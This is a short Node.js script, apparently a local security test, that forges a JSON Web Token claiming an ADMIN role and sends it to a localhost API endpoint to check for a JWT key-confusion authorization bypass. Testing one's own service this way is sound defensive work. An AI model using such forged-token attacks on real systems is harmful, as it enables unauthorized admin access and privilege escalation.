const jwt = require('jsonwebtoken');

async function attack() {
  // Attack: Try to forge a token with "none" algorithm or HS256
  const payload = {
    sub: "hacked",
    role: "ADMIN",
    companyId: "hacked"
  };
  
  const token = jwt.sign(payload, '[REDACTED_SECRET]', { algorithm: 'HS256' });

  const getReq = await fetch(`http://localhost:8080/api/v1/companies/hacked`, {
    method: 'GET',
    headers: { 'Authorization': `Bearer ${token}` }
  });
  console.log("JWT KEY CONFUSION:", await getReq.status, await getReq.text());
}
attack();
